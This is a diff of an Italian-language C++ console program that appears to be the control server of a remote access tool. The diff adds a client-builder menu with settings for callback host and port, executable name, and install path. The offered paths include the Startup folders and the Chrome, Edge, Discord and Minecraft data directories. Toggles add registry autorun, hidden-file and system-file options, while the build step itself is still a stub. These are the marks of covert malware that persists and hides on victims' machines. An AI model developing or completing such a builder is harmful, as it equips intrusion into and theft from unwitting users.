@@ -9,7 +9,7 @@ using namespace std;
 
 #include "Client.h"
 
-string Version = "2.0.0";
+string Version = "2.0.0 B1";
 CLIENT Clients[MAX_CLIENTS];
 
 #include "Classi.h"
@@ -24,15 +24,17 @@ int main()
     CLInterface cli;
     TextColor tc;
     DirUtils du;
-    Settaggi settaggi;
+    SettaggiServer SettaggiS;
+    SettaggiClient SettaggiC;
     ConsoleUtils cu;
     WindowUtils wu;
     TcpIP Server;
-    Clu = new ClientUtils(settaggi);
+    Clu = new ClientUtils(SettaggiS);
 
     VectString MenuPrincipale;
     VectString HeaderTabella;
     VectString BodyTabella;
+    VectString Percorsi;
 
     bool CicloMenu = true;
 
@@ -58,6 +60,21 @@ int main()
     HeaderTabella.push_back("OS");
     HeaderTabella.push_back("Stato");
 
+    cli.LoadingPercentage = 15;
+    cli.LoadingText = "Caricamento Percorsi...";
+
+    Percorsi.push_back("C:");
+    Percorsi.push_back("C:\\Users\\<User>\\Documents");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Discord");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Google\\Chrome\\User Data");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Microsoft\\Edge\\User Data");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Microsoft\\WindowsApps");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Temp");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Roaming\\.minecraft");
+    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+    Percorsi.push_back("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
+    Percorsi.push_back("C:\\Windows");
+
     cli.LoadingPercentage = 20;
     cli.LoadingText = "Rimozione Update...";
 
@@ -68,7 +85,7 @@ int main()
     cli.LoadingPercentage = 30;
     cli.LoadingText = "Caricamento Impostazioni...";
 
-    if (!settaggi.GetSettings())
+    if (!SettaggiS.GetSettings())
     {
         cli.StopBar(250);
 
@@ -81,19 +98,19 @@ int main()
     cli.LoadingPercentage = 40;
     cli.LoadingText = "Controllo Aggiornamenti...";
 
-    if (settaggi.VerificaAggiornamenti)
-        VerificaAggiornamenti(settaggi.AutoAggiornamento);
+    if (SettaggiS.VerificaAggiornamenti)
+        VerificaAggiornamenti(SettaggiS.AutoAggiornamento);
 
     cli.LoadingPercentage = 50;
     cli.LoadingText = "Impostazione Finestra...";
 
     Clu->AggiornaTitolo(Clu->Menu);
-    wu.SetWindowSize({ settaggi.DimensioniFinestra.X, settaggi.DimensioniFinestra.Y });
+    wu.SetWindowSize({ SettaggiS.DimensioniFinestra.X, SettaggiS.DimensioniFinestra.Y });
 
     cli.LoadingPercentage = 60;
     cli.LoadingText = "Avvio Server...";
 
-    Server.Port = settaggi.Porta;
+    Server.Port = SettaggiS.Porta;
     if (Server.StartServer() != 0)
     {
         cli.StopBar(250);
@@ -191,7 +208,75 @@ int main()
 
             // Crea Client
             case 2:
-                return 0;
+                while (CicloMenu)
+                {
+                    system("cls");
+                    StampaTitolo(1);
+                    cli.SubTitle("Crea Client", 60, tc.Green);
+
+                    SettaggiC.GetSettings();
+
+                    switch (SettaggiC.ShowSettings())
+                    {
+                        // Esci
+                        case 0:
+                            CicloMenu = false;
+                            break;
+
+                        // Host
+                        case 1:
+                            cout << "\nInserisci l'host." << endl;
+                            StampaPrefix();
+                            getline(cin, SettaggiC.Host);
+                            break;
+
+                        // Porta
+                        case 2:
+                            cout << "\nInserisci la porta." << endl;
+                            StampaPrefix();
+                            cin >> SettaggiC.Porta;
+                            cin.ignore();
+                            break;
+
+                        // Percorso d'Installazione
+                        case 3:
+                            cout << "\nScegli il percorso d'installazione." << endl;
+
+                            SettaggiC.InstallPath = Percorsi[cli.MenuSingleSelScorrimento(Percorsi, tc.Purple)];
+                            break;
+
+                        // Nome Exe
+                        case 4:
+                            cout << "\nInserisci il nome del file .exe" << endl;
+                            StampaPrefix();
+                            getline(cin, SettaggiC.ExeName);
+                            break;
+
+                        // Auto Run
+                        case 5:
+                            SettaggiC.RegStartup = !SettaggiC.RegStartup;
+                            break;
+
+                        // File Nascosto
+                        case 6:
+                            SettaggiC.HideExe = !SettaggiC.HideExe;
+                            break;
+
+                        // File di Sistema
+                        case 7:
+                            SettaggiC.SystemFile = !SettaggiC.SystemFile;
+                            break;
+
+                        // Crea Client
+                        case 8:
+                            // WIP
+                            break;
+                    }
+
+                    SettaggiC.SetSettings();
+                }
+
+                CicloMenu = true;
                 break;
 
             // Comandi Comuni
@@ -207,9 +292,9 @@ int main()
                     StampaTitolo(1);
                     cli.SubTitle("Impostazioni", 60, tc.Green);
 
-                    settaggi.GetSettings();
+                    SettaggiS.GetSettings();
 
-                    switch (settaggi.ShowSettings())
+                    switch (SettaggiS.ShowSettings())
                     {
                         // Esci
                         case 0:
@@ -220,18 +305,18 @@ int main()
                         case 1:
                             cout << "\nInserisci la porta." << endl;
                             StampaPrefix();
-                            cin >> settaggi.Porta;
+                            cin >> SettaggiS.Porta;
                             cin.ignore();
                             break;
 
                         // Aggiornamenti
                         case 2:
-                            settaggi.VerificaAggiornamenti = !settaggi.VerificaAggiornamenti;
+                            SettaggiS.VerificaAggiornamenti = !SettaggiS.VerificaAggiornamenti;
                             break;
 
                             // Auto Aggiornamenti
                         case 3:
-                            settaggi.AutoAggiornamento = !settaggi.AutoAggiornamento;
+                            SettaggiS.AutoAggiornamento = !SettaggiS.AutoAggiornamento;
                             break;
 
                         // Colori
@@ -244,12 +329,12 @@ int main()
                             cout << "\nRidimensiona le finestra a piacimento e premi invio per salvare." << endl;
                             _getch();
 
-                            settaggi.DimensioniFinestra.X = wu.GetWindowSize().X;
-                            settaggi.DimensioniFinestra.Y = wu.GetWindowSize().Y;
+                            SettaggiS.DimensioniFinestra.X = wu.GetWindowSize().X;
+                            SettaggiS.DimensioniFinestra.Y = wu.GetWindowSize().Y;
                             break;
                     }
 
-                    settaggi.SetSettings();
+                    SettaggiS.SetSettings();
                 }
                 
                 CicloMenu = true;
